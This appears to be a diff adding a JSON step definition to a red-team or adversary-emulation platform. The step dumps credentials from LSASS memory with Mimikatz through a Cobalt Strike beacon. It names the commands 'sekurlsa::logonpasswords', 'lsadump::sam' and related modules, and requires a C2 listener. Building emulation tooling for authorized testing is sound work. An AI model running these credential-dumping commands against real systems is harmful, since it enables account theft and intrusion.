@@ -1,0 +1,68 @@
+{
+  "_key": "lib_cs_mimikatz_full",
+  "name": "Credential Dump (Mimikatz)",
+  "category": "Cobalt Strike",
+  "tactic": "TA0006",
+  "icon": "\ud83d\udd11",
+  "riskLevel": "critical",
+  "description": "Extract credentials from LSASS memory using Mimikatz sekurlsa module",
+  "subcategory": "Memory Scraping",
+  "estimatedDuration": 45,
+  "executionType": "cobalt_strike",
+  "cobaltStrikeCommand": "mimikatz sekurlsa::logonpasswords",
+  "robotKeyword": null,
+  "robotTemplate": null,
+  "shellCommand": null,
+  "inputs": [
+    {
+      "id": "beacon",
+      "label": "Target Beacon",
+      "type": "Agent_Session",
+      "required": true,
+      "description": "Active beacon with elevated privileges required"
+    }
+  ],
+  "outputs": [
+    {
+      "id": "credentials",
+      "label": "Dumped Credentials",
+      "type": "Credential_Set",
+      "description": "Extracted usernames, passwords, and hashes"
+    }
+  ],
+  "parameters": [
+    {
+      "id": "command",
+      "label": "Mimikatz Command",
+      "type": "select",
+      "required": true,
+      "placeholder": null,
+      "default": "sekurlsa::logonpasswords",
+      "options": [
+        "sekurlsa::logonpasswords",
+        "sekurlsa::tickets",
+        "lsadump::sam",
+        "privilege::debug"
+      ],
+      "description": "Mimikatz module to execute"
+    }
+  ],
+  "requirements": {
+    "c2Server": true,
+    "listeners": [
+      "http-listener-01"
+    ],
+    "payloads": [],
+    "sshConnections": [],
+    "externalTools": [],
+    "libraries": []
+  },
+  "metadata": {
+    "version": "1.0",
+    "tags": [
+      "credential-access",
+      "mimikatz",
+      "lsass"
+    ]
+  }
+}
